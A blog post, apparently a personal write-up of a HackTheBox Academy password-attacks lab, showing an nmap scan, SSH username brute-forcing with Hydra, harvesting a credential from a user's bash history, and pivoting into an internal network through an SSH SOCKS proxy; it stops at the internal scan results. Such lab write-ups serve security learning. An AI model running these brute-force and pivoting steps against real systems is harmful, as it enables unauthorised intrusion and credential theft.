<!doctype html><html lang=en data-theme=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload as=font type=font/woff2 href=/fonts/roboto-slab-latin-400.woff2 crossorigin=anonymous><link rel=preload as=font type=font/woff2 href=/fonts/roboto-slab-latin-700.woff2 crossorigin=anonymous><link rel=preload as=font type=font/woff2 href=/fonts/fira-code-latin-300.woff2 crossorigin=anonymous><link rel=preload as=font type=font/woff2 href=/fonts/fira-code-latin-400.woff2 crossorigin=anonymous><link rel=preload as=font type=font/woff2 href=/fonts/fira-code-latin-700.woff2 crossorigin=anonymous><meta name=robots content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>16JUL25 - The Credential Theft Shuffle</title>
<meta name=description content="01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC."><link rel=canonical href=https://thaddeuskoenig.com/blog/20250716/><meta name=twitter:card content="summary"><meta name=twitter:title content="16JUL25 - The Credential Theft Shuffle"><meta name=twitter:description content="01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC."><meta property="og:url" content="https://thaddeuskoenig.com/blog/20250716/"><meta property="og:site_name" content="Thaddeus Koenig"><meta property="og:title" content="16JUL25 - The Credential Theft Shuffle"><meta property="og:description" content="01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-07-16T11:22:00-05:00"><meta property="article:modified_time" content="2025-08-28T12:36:31-04:00"><meta property="article:tag" content="Hackthebox"><meta property="article:tag" content="Password Attacks"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Pass the Hash"><meta property="article:tag" content="Active Directory"><meta itemprop=name content="16JUL25 - The Credential Theft Shuffle"><meta itemprop=description content="01. Intro# I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
02. Gathering Initial Info# To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC."><meta itemprop=datePublished content="2025-07-16T11:22:00-05:00"><meta itemprop=dateModified content="2025-08-28T12:36:31-04:00"><meta itemprop=wordCount content="1928"><meta itemprop=keywords content="Hackthebox,Password Attacks,Pivoting,Pass the Hash,Active Directory"><style>@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:100;src:local("Roboto Slab Thin "),local("Roboto Slab-Thin"),url(/fonts/roboto-slab-latin-100.woff2) format("woff2"),url(/fonts/roboto-slab-latin-100.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:200;src:local("Roboto Slab Extra Light "),local("Roboto Slab-Extra Light"),url(/fonts/roboto-slab-latin-200.woff2) format("woff2"),url(/fonts/roboto-slab-latin-200.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:300;src:local("Roboto Slab Light "),local("Roboto Slab-Light"),url(/fonts/roboto-slab-latin-300.woff2) format("woff2"),url(/fonts/roboto-slab-latin-300.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:400;src:local("Roboto Slab Regular "),local("Roboto Slab-Regular"),url(/fonts/roboto-slab-latin-400.woff2) format("woff2"),url(/fonts/roboto-slab-latin-400.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:500;src:local("Roboto Slab Medium "),local("Roboto Slab-Medium"),url(/fonts/roboto-slab-latin-500.woff2) format("woff2"),url(/fonts/roboto-slab-latin-500.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:600;src:local("Roboto Slab SemiBold "),local("Roboto Slab-SemiBold"),url(/fonts/roboto-slab-latin-600.woff2) format("woff2"),url(/fonts/roboto-slab-latin-600.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:700;src:local("Roboto Slab Bold "),local("Roboto Slab-Bold"),url(/fonts/roboto-slab-latin-700.woff2) format("woff2"),url(/fonts/roboto-slab-latin-700.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:800;src:local("Roboto Slab ExtraBold "),local("Roboto Slab-ExtraBold"),url(/fonts/roboto-slab-latin-800.woff2) format("woff2"),url(/fonts/roboto-slab-latin-800.woff) format("woff")}@font-face{font-display:swap;font-family:Roboto Slab;font-style:normal;font-weight:900;src:local("Roboto Slab Black "),local("Roboto Slab-Black"),url(/fonts/roboto-slab-latin-900.woff2) format("woff2"),url(/fonts/roboto-slab-latin-900.woff) format("woff")}@font-face{font-display:swap;font-family:Fira Code;font-style:normal;font-weight:300;src:local("Fira Code Light "),local("Fira Code-Light"),url(/fonts/fira-code-latin-300.woff2) format("woff2"),url(/fonts/fira-code-latin-300.woff) format("woff")}@font-face{font-display:swap;font-family:Fira Code;font-style:normal;font-weight:400;src:local("Fira Code Regular "),local("Fira Code-Regular"),url(/fonts/fira-code-latin-400.woff2) format("woff2"),url(/fonts/fira-code-latin-400.woff) format("woff")}@font-face{font-display:swap;font-family:Fira Code;font-style:normal;font-weight:500;src:local("Fira Code Medium "),local("Fira Code-Medium"),url(/fonts/fira-code-latin-500.woff2) format("woff2"),url(/fonts/fira-code-latin-500.woff) format("woff")}@font-face{font-display:swap;font-family:Fira Code;font-style:normal;font-weight:600;src:local("Fira Code SemiBold "),local("Fira Code-SemiBold"),url(/fonts/fira-code-latin-600.woff2) format("woff2"),url(/fonts/fira-code-latin-600.woff) format("woff")}@font-face{font-display:swap;font-family:Fira Code;font-style:normal;font-weight:700;src:local("Fira Code Bold "),local("Fira Code-Bold"),url(/fonts/fira-code-latin-700.woff2) format("woff2"),url(/fonts/fira-code-latin-700.woff) format("woff")}

/*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}[hidden],template{display:none}

/*! CC BY-SA 3.0 License | https://stackoverflow.com/a/36118384/1154965 */@keyframes blink{50%{opacity:0}to{opacity:1}}

/*! MIT License | github.com/schnerring/hugo-theme-gruvbox */:root[data-theme=light]{--bg:var(--bg0_h);--bg0:#fbf1c7;--bg0_h:#f9f5d7;--bg0_s:#f2e5bc;--bg1:#ebdbb2;--bg2:#d5c4a1;--bg3:#bdae93;--bg4:#a89984;--fg:var(--fg1);--fg0:#282828;--fg1:#3c3836;--fg2:#504945;--fg3:#665c54;--fg4:#7c6f64;--gray1:var(--fg4);--gray2:#928374;--red1:#cc241d;--red2:#9d0006;--green1:#98971a;--green2:#797403;--yellow1:#d79921;--yellow2:#b57614;--blue1:#458588;--blue2:#076678;--purple1:#b16286;--purple2:#8f3f71;--aqua1:#689d6a;--aqua2:#427b58;--orange1:#d65d0e;--orange2:#af3a03}[data-theme=light]:root .light--hidden{display:none}:root[data-theme=dark]{--bg:var(--bg0_h);--bg0:#282828;--bg0_h:#1d2021;--bg0_s:#32302f;--bg1:#3c3836;--bg2:#504945;--bg3:#665c54;--bg4:#7c6f64;--fg:var(--fg1);--fg0:#fbf1c7;--fg1:#ebdbb2;--fg2:#d5c4a1;--fg3:#bdae93;--fg4:#a89984;--gray1:var(--fg4);--gray2:#928374;--red1:#cc241d;--red2:#fb4934;--green1:#98971a;--green2:#b8bb26;--yellow1:#d79921;--yellow2:#fabd2f;--blue1:#458588;--blue2:#83a598;--purple1:#b16286;--purple2:#d3869b;--aqua1:#689d6a;--aqua2:#8ec07c;--orange1:#d65d0e;--orange2:#fe8019}[data-theme=dark]:root .dark--hidden{display:none}:root{--primary:var(--aqua1);--primary-alt:var(--aqua2);--font-monospace:"Fira Code","Lucida Console",Monaco,monospace;--font-sans-serif:Verdana,Helvetica,sans-serif;--font-serif:"Roboto Slab",Georgia,serif}html{font-family:Roboto Slab,Georgia,serif;font-family:var(--font-serif);font-size:1rem;scroll-behavior:smooth}body{background:var(--bg);color:var(--fg);line-height:1.675;word-wrap:break-word}strong{letter-spacing:.35px}a{color:inherit;-webkit-text-decoration:none;text-decoration:none}a.link--external:after{content:"\2009↗"}img{border:2px solid var(--bg1);height:auto;max-width:100%}::-moz-selection{background:var(--bg4);color:var(--fg0)}::selection{background:var(--bg4);color:var(--fg0)}h1,h2,h3{color:var(--fg0);font-family:Fira Code,Lucida Console,Monaco,monospace;font-family:var(--font-monospace);font-weight:300;line-height:1.4}h1 code,h2 code,h3 code{font-size:1em}h2,h3{border-bottom:1px solid var(--bg1)}h1,h2{font-weight:400}h1{font-size:1.875rem}h2{font-size:1.75rem}h3{font-size:1.625rem}@media (min-width:768px){h1{font-size:2.375rem}h2{font-size:2rem}h3{font-size:1.75rem}}table{border-collapse:collapse;margin:2rem 0;table-layout:fixed;width:100%}table,td,th{border:1px solid var(--bg1);padding:.5rem}hr{background:var(--bg1);border:none;height:1px;margin:3rem auto;width:80%}code,pre{border-radius:.2rem;padding:0 .2em}pre code{padding:0}code,pre,th{background:var(--bg1)}code,pre,th{font-family:Fira Code,Lucida Console,Monaco,monospace;font-family:var(--font-monospace)}code code{background:var(--bg2)}pre{padding:1rem}pre{background:var(--bg1)!important;overflow:auto}pre code{background:none}pre::-webkit-scrollbar{height:.5rem;scrollbar-width:auto}pre::-webkit-scrollbar-track{background:var(--bg2);border-radius:.2rem}pre::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:.2rem}.layout{display:grid;grid-template-areas:"header" "main" "footer";grid-template-rows:auto 1fr auto;height:100vh}main{align-items:start;display:grid;grid-area:main;grid-template-areas:"empty content sidebar";grid-template-columns:1fr minmax(0,650px) 4fr}header{background:var(--bg1);grid-area:header}footer{grid-area:footer}footer,main{margin:.5em 1.1em}.content{grid-area:content}.sidebar{display:none;flex-direction:column;grid-area:sidebar;margin-top:3rem;position:sticky;top:2rem}@media (min-width:992px){.sidebar{display:flex}}header{display:grid;font-family:Fira Code,Lucida Console,Monaco,monospace;font-family:var(--font-monospace);font-size:1.125rem;grid-template-areas:"heading search nav theme-toggle";grid-template-columns:auto auto 1fr auto;padding:.75rem}.logo{color:var(--fg0);display:flex;font-weight:700;grid-area:heading}.logo:hover .logo__cursor{animation:blink 1s infinite;opacity:1}.logo__chevron,.logo__cursor{margin-left:.5rem}.logo__cursor{opacity:0}.logo__text{display:none}@media (min-width:768px){.logo__text{display:block}}.search{display:flex;grid-area:search;margin:0 1rem}#search__text{background:var(--bg2);border:1px solid var(--bg2);border-radius:.2rem;caret-color:var(--fg);color:var(--fg);outline:none;padding:0 .5rem;width:100%}#search__text:hover{border-color:var(--bg3)}#search__text:focus{border-color:var(--bg4)}#search__text::-moz-placeholder{color:var(--fg3)}#search__text::placeholder{color:var(--fg3)}#search__text[type=search]::-webkit-search-cancel-button{-webkit-appearance:none;appearance:none}#search__suggestions{background:var(--bg);border-radius:.2rem;box-shadow:0 .5rem 1rem var(--bg1);font-family:Roboto Slab,Georgia,serif;font-family:var(--font-serif);left:0;margin-top:2rem;position:absolute;width:95vw;z-index:1000}@media (min-width:768px){.search{position:relative}#search__suggestions{width:60vw}}.search__suggestions--hidden{display:none}.search__suggestion-item{border-bottom:1px dashed var(--bg2);display:grid;grid-template-columns:1fr 2fr}.search__suggestion-item:focus,.search__suggestion-item:focus-visible,.search__suggestion-item:hover{background:var(--bg1);cursor:pointer;outline:none}.search__suggestion-item:last-child{border:none}.search__suggestion-description,.search__suggestion-title{margin:1rem 0;padding:0 1rem}.search__suggestion-title{font-weight:700}.search__suggestion-description{border-left:1px solid var(--bg2)}.search__no-results{padding:.75rem}.theme__toggle{align-items:center;background:none;border:none;color:var(--yellow1);cursor:pointer;display:flex;grid-area:theme-toggle;margin:0 1rem}.theme__toggle:hover{color:var(--yellow2)}.theme__toggle svg{height:28px;width:28px}nav#menu{align-items:center;display:flex;grid-area:nav;justify-content:flex-end}nav#menu .menu__item{color:var(--fg)}nav#menu .menu__item:hover{color:var(--fg3);cursor:pointer}nav#menu ul{list-style:none;margin:0;padding:0}nav#menu ul.menu--horizontal{align-items:center;display:none}nav#menu ul.menu--horizontal li{display:inline-block;margin:0 .75rem}@media (min-width:768px){nav#menu ul.menu--horizontal{display:flex}}nav#menu ul.menu--vertical{background:var(--fg0);bottom:0;margin:0;padding:3rem;position:fixed;right:0;top:0;transform:translate(100%);transition:transform .5s cubic-bezier(.9,0,.1,1);width:50%;z-index:10}nav#menu ul.menu--vertical .menu__item{color:var(--bg1)}nav#menu ul.menu--vertical .menu__item:hover{color:var(--bg4)}nav#menu .menu__burger{display:flex;height:24px;width:24px}nav#menu .menu__burger>*{position:absolute}nav#menu .menu__burger svg{height:inherit;width:inherit;z-index:20}nav#menu .menu__burger input{height:inherit;opacity:0;width:inherit;z-index:30}nav#menu .menu__burger input:checked~ul.menu--vertical{transform:none}nav#menu .menu__burger input:checked~svg{stroke:var(--bg1)}@media (min-width:768px){nav#menu .menu__burger{display:none}}.sidebar{font-family:Fira Code,Lucida Console,Monaco,monospace;font-family:var(--font-monospace);margin-left:auto;margin-right:auto;max-width:350px;padding-left:2.5rem}.sidebar hr{margin:1.5rem auto}.sidebar svg{fill:var(--fg)}.jr-basics__image{background:var(--bg1);border:2px solid var(--bg2)}.jr-basics__summary{color:var(--fg3);font-family:Roboto Slab,Georgia,serif;font-family:var(--font-serif);margin:.75rem 0}.jr-basics__profile a:hover{color:var(--fg3)}.jr-basics__profile a:hover svg{fill:var(--fg3)}.content-section,.post{border-bottom:2px dotted var(--bg1);padding:2rem 0}.post img:not(figure img){box-sizing:border-box;margin:.5rem 0}.post-content__read-more,.post-header{font-family:Fira Code,Lucida Console,Monaco,monospace;font-family:var(--font-monospace)}.post-content{margin:1.3rem 0}.post-content__read-more{color:var(--primary-alt);margin-top:1.3rem}.post-content a,.post-header a{color:var(--primary-alt)}.post-content a:hover,.post-header a:hover{color:var(--primary)}.post-tags{align-items:center;display:flex;flex-wrap:wrap;gap:.9rem;margin:1rem 0}.post-tag{font-size:.9rem;line-height:1}.post-tag:before{content:"#"}.post-heading__anchor{display:none}h1:hover .post-heading__anchor,h2:hover .post-heading__anchor,h3:hover .post-heading__anchor{display:inline-block}.jr-basics__image,.jr-basics__item,.jr-basics__profile-icon,.jr-basics__profile-item{align-items:center;display:flex}.jr-basics__name{font-size:1.125rem;font-weight:700}.jr-basics__item{flex-direction:column;text-align:center}.jr-basics__item hr{margin:1.5rem auto}.jr-basics__image{border-radius:50%;height:250px;justify-content:center;overflow:hidden;width:250px}.jr-basics__label,.jr-basics__name,.jr-basics__summary{margin-top:.75rem}.jr-basics__profile svg{height:24px;width:24px}.jr-basics__profile,.jr-basics__profile-item{display:flex}.jr-basics__profile-item{display:flex;padding:.2rem}.jr-basics__profile--col{flex-direction:column}.jr-basics__profile--row{flex-wrap:wrap;justify-content:space-evenly}.jr-basics__profile-icon{padding:0 .75rem}</style><link rel=preload href="/css/non-critical.979fb31ac332b42b6b26763f7263e452271c9d83fa454c048b951eee7c8c74d628fcd72697b3ac484f455f71c091a1d2db913786fe6c795eafab76cd7cbaba99.css" as=style onload='this.onload=null,this.rel="stylesheet"' integrity="sha512-l5+zGsMytCtrJnY/cmPkUiccnYP6RUwEi5Ue7nyMdNYo/Ncml7OsSE9FX3HAkaHS25E3hv5seV6vq3bNfLq6mQ=="><link id=prism-dark rel=preload href=/prism-themes/prism-gruvbox-dark.min.54aecc64074623a4f9898544dcbdab9e804f1560ef0b38f4cf8e10fcaaf72264e798cb407c601aca6ecd833ec4eb93d66535581f18d45ba202cf848b70dbc332.css as=style onload='this.onload=null,this.rel="stylesheet"' integrity="sha512-VK7MZAdGI6T5iYVE3L2rnoBPFWDvCzj0z44Q/Kr3ImTnmMtAfGAaym7Ngz7E65PWZTVYHxjUW6ICz4SLcNvDMg=="><link id=prism-light rel=preload href=/prism-themes/prism-gruvbox-light.min.42a221741efe997fcc94187c39d63c555560678789ac9ca856c74a5f0ddb2aa6c50d38b2ffbecc7a99038cbbd2efa99746e862267f781c559e0cfec10b88a5fc.css as=style onload='this.onload=null,this.rel="stylesheet"' integrity="sha512-QqIhdB7+mX/MlBh8OdY8VVVgZ4eJrJyoVsdKXw3bKqbFDTiy/77MepkDjLvS76mXRuhiJn94HFWeDP7BC4il/A==" disabled><noscript><link rel=stylesheet href=/prism-themes/prism-gruvbox-dark.min.54aecc64074623a4f9898544dcbdab9e804f1560ef0b38f4cf8e10fcaaf72264e798cb407c601aca6ecd833ec4eb93d66535581f18d45ba202cf848b70dbc332.css integrity="sha512-VK7MZAdGI6T5iYVE3L2rnoBPFWDvCzj0z44Q/Kr3ImTnmMtAfGAaym7Ngz7E65PWZTVYHxjUW6ICz4SLcNvDMg=="><link rel=stylesheet href="/css/non-critical.979fb31ac332b42b6b26763f7263e452271c9d83fa454c048b951eee7c8c74d628fcd72697b3ac484f455f71c091a1d2db913786fe6c795eafab76cd7cbaba99.css" integrity="sha512-l5+zGsMytCtrJnY/cmPkUiccnYP6RUwEi5Ue7nyMdNYo/Ncml7OsSE9FX3HAkaHS25E3hv5seV6vq3bNfLq6mQ=="></noscript><script>(()=>{function n(){if(localStorage&&localStorage.getItem("theme"))return localStorage.getItem("theme");if(window.matchMedia)return window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark"}function e(e){document.documentElement.setAttribute("data-theme",e);let t=document.getElementById("prism-dark"),n=document.getElementById("prism-light");t.toggleAttribute("disabled",e==="light"),n.toggleAttribute("disabled",e==="dark"),localStorage.setItem("theme",e)}var t=n();t&&e(t);function s(t){let n=t.currentTarget.classList.contains("light--hidden")?"light":"dark";e(n)}document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll(".theme__toggle").forEach(e=>{e.addEventListener("click",s)})})})()</script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#282828><meta name=msapplication-TileColor content="#282828"><meta name=theme-color content="#282828"></head><body><div class=layout><header><a class=logo href=/><div class=logo__text>thaddeuskoenig.com</div><div class=logo__chevron>></div><div class=logo__cursor>█</div></a><div class=search><input id=search__text type=search placeholder=Search... aria-label=Search autocomplete=off><div id=search__suggestions class=search__suggestions--hidden></div></div><nav id=menu><ul class=menu--horizontal><li class=menu__item><a href=/blog>Blog</a></li><li class=menu__item><a href=/projects>Projects</a></li><li class=menu__item><a href=/about>About</a></li></ul><div class=menu__burger><input class=menu__item type=checkbox aria-label="Open main menu"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-2"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg><ul class=menu--vertical><li><a class=menu__item href=/blog>Blog</a></li><li><a class=menu__item href=/projects>Projects</a></li><li><a class=menu__item href=/about>About</a></li></ul></div></nav><button class="theme__toggle light--hidden" aria-label="Toggle light mode">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-sun"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-4 0a4 4 0 108 0 4 4 0 10-8 0"/><path d="M3 12h1m8-9v1m8 8h1m-9 8v1M5.6 5.6l.7.7m12.1-.7-.7.7m0 11.4.7.7m-12.1-.7-.7.7"/></svg>
</button>
<button class="theme__toggle dark--hidden" aria-label="Toggle dark mode"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-moon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/></svg></button></header><main><div class=content><article class=post><div class=post-header><h1>16JUL25 - The Credential Theft Shuffle</h1><div class=post-meta><span>2025-07-16</span><span> (updated: 2025-08-28)</span><div class=post-tags><a class=post-tag href=https://thaddeuskoenig.com/tags/hackthebox>hackthebox</a><a class=post-tag href=https://thaddeuskoenig.com/tags/password-attacks>password&#8209;attacks</a><a class=post-tag href=https://thaddeuskoenig.com/tags/pivoting>pivoting</a><a class=post-tag href=https://thaddeuskoenig.com/tags/pass-the-hash>pass&#8209;the&#8209;hash</a><a class=post-tag href=https://thaddeuskoenig.com/tags/active-directory>active&#8209;directory</a></div></div></div><div class=post-content><h2 id=01-intro>01. Intro<a href=#01-intro class=post-heading__anchor aria-hidden=true>#</a></h2><p>I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.</p><h2 id=02-gathering-initial-info>02. Gathering Initial Info<a href=#02-gathering-initial-info class=post-heading__anchor aria-hidden=true>#</a></h2><p>To start this engagement we know a couple things. We have a user Betty Jade that works at Nexura LLC. We also have a password for the user <code>&lt;REDACTED></code> with a reasonable assumption that she reuses passwords. We also have the scope of this engagement with the following devices:</p><table><thead><tr><th>Host</th><th>IP Address</th></tr></thead><tbody><tr><td>DMZ01</td><td>10.129.39.174, 172.16.119.13</td></tr><tr><td>JUMP01</td><td>172.16.119.7</td></tr><tr><td>FILE01</td><td>172.16.119.10</td></tr><tr><td>DC01</td><td>172.16.119.11</td></tr></tbody></table><p><picture><source type=image/webp srcset="/blog/20250716/20250716_netmap_hu1045599438345728610.webp 300w,/blog/20250716/20250716_netmap_hu14963767527875412677.webp 445w" sizes="(max-width: 499px) 300px,445px"><img src=/blog/20250716/20250716_netmap.png srcset="/blog/20250716/20250716_netmap_hu8440874815440692388.png 300w,/blog/20250716/20250716_netmap_hu13653689240852113705.png 445w" sizes="(max-width: 499px) 300px,445px" alt="Network Map" loading=lazy width=445 height=382></picture></p><h2 id=03-scanning-the-external-device>03. Scanning the External Device<a href=#03-scanning-the-external-device class=post-heading__anchor aria-hidden=true>#</a></h2><p>Since only one device in this network is publicly accessible, we can give it a quick scan to see what ports we have available for remote access.</p><pre tabindex=0><code>th@ddeu$ nmap -sS -p 21-23,80,135,443,445,3389,5985,5986,8080 -T4 -oA dmz01_scan 10.129.39.174

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 12:25 CDT
Nmap scan report for 10.129.39.174
Host is up (0.012s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   open   ssh
23/tcp   closed telnet
80/tcp   closed http
135/tcp  closed msrpc
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
5985/tcp closed wsman
5986/tcp closed wsmans
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
</code></pre><h2 id=04-gaining-initial-access>04. Gaining Initial Access<a href=#04-gaining-initial-access class=post-heading__anchor aria-hidden=true>#</a></h2><p>From here we can see that SSH is open. Since we have a possible password but no username. We can create a list of possible usernames based on the name Betty Jayde using <a href=https://github.com/urbanadventurer/username-anarchy class=link--external target=_blank rel=noreferrer>Username-Anarchy</a> and brute forcing the resulting usernames using <a href=https://www.kali.org/tools/hydra/ class=link--external target=_blank rel=noreferrer>Hydra</a></p><pre tabindex=0><code>th@ddeu$ git clone https://github.com/urbanadventurer/username-anarchy.git
th@ddeu$ cd username-anarchy
th@ddeu$ ./username-anarchy Betty Jade &gt; /tmp/bjade.txt
th@ddeu$ hydra -L /tmp/bjade.txt -p &#39;&lt;REDACTED&gt;&#39; ssh://10.129.39.174
--SNIP--
[22][ssh] host: 10.129.39.174   login: &lt;REDACTED&gt;   password: &lt;REDACTED&gt;
--SNIP--
</code></pre><p>Now we that we have a valid username and password we can log into the machine to verify access.</p><pre tabindex=0><code>th@ddeu$ ssh &lt;REDACTED&gt;@10.129.39.174
&lt;REDACTED&gt;@DMZ01:~$ 
</code></pre><p>At this point we can see that we are on an Ubuntu 20.04 server. The user has no sudo privilges and if we do a list of the files available to this user we can see the following standard files</p><pre tabindex=0><code>&lt;REDACTED&gt;@DMZ01:~$ sudo -l
[sudo] password for &lt;REDACTED&gt;: 
Sorry, user &lt;REDACTED&gt; may not run sudo on DMZ01.

&lt;REDACTED&gt;@DMZ01:~$ ll
total 32
drwxr-xr-x 4 &lt;REDACTED&gt; &lt;REDACTED&gt; 4096 Jun  2 08:17 ./
drwxr-xr-x 4 root   root   4096 May 30 11:35 ../
-rw-r--r-- 1 &lt;REDACTED&gt; &lt;REDACTED&gt; 2139 Jun  2 08:19 .bash_history
-rw-r--r-- 1 &lt;REDACTED&gt; &lt;REDACTED&gt;  220 Apr 29 13:20 .bash_logout
-rw-r--r-- 1 &lt;REDACTED&gt; &lt;REDACTED&gt; 3771 Apr 29 13:20 .bashrc
drwx------ 2 &lt;REDACTED&gt; &lt;REDACTED&gt; 4096 May 30 11:35 .cache/
drwxrwxr-x 3 &lt;REDACTED&gt; &lt;REDACTED&gt; 4096 May 30 11:35 .local/
-rw-r--r-- 1 &lt;REDACTED&gt; &lt;REDACTED&gt;  807 Apr 29 13:20 .profile
</code></pre><p>Of these files, the only thing I can really think of to do is checking the bash history for any commands the user has run and maybe the profile files to see any potential startup scripts or environment variables of note</p><pre tabindex=0><code>&lt;REDACTED&gt;@DMZ01:~$ less -N .bash_history 
--SNIP--
     25 sshpass -p &#34;&lt;REDACTED&gt;&#34; ssh hwilliam@file01
--SNIP--
     40 ssh user@192.168.0.101
     41 scp file.txt user@192.168.0.101:~/Documents/
--SNIP--
     64 sudo adduser testuser
     65 sudo usermod -aG sudo testuser
     66 su - testuser
--SNIP--
</code></pre><h2 id=05-pivoting-out-of-the-dmz>05. Pivoting out of the DMZ<a href=#05-pivoting-out-of-the-dmz class=post-heading__anchor aria-hidden=true>#</a></h2><p>The testuser line seemed pretty interesting as we could potentially use that to get root access to this machine, unfortunately that user no longer exists. Next the 192.168.0.101 machine is out of scope. Lastly we can see potential credentials to FILE01, which is in scope. So when I first tried to go about this, i spent too much time trying to escalate privileges on this machine so that i could use <a href=https://github.com/jpillora/chisel class=link--external target=_blank rel=noreferrer>chisel</a> or to be able to ssh tunnel since that was locked down. Turns out all i needed to do was use the built in SSH SOCKS5 Proxy and proxychains my traffic through to the target machines.</p><pre tabindex=0><code>th@ddeu$ ssh -D 9050 &lt;REDACTED&gt;@10.129.39.174
th@ddeu$ sudo vim /etc/proxychains.conf
# ENSURE YOUR CONFIG HAS THE FOLLOWING
--SNIP--
[ProxyList]
socks5 127.0.0.1 9050
--SNIP--
# THIS NEXT COMMAND WILL TAKE A SEC, GO DRINK WATER
th@ddeu$ sudo proxychains nmap -Pn -sT -p 21-23,80,135,443,445,3389,5985,5986,8080 -T4 -oA internal_scan 172.16.119.7 172.16.119.10 172.16.119.11 
--SNIP--
     21 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
     22 Nmap scan report for 172.16.119.7
     33 3389/tcp open   ms-wbt-server
     34 5985/tcp open   wsman
     37 
     38 Nmap scan report for 172.16.119.10
     46 135/tcp  open   msrpc
     48 445/tcp  open   microsoft-ds
     49 3389/tcp open   ms-wbt-server
     50 5985/tcp open   wsman
     53 
     54 Nmap scan report for 172.16.119.11
     62 135/tcp  open   msrpc
     64 445/tcp  open   microsoft-ds
     65 3389/tcp open   ms-wbt-server
     66 5985/tcp open   wsman
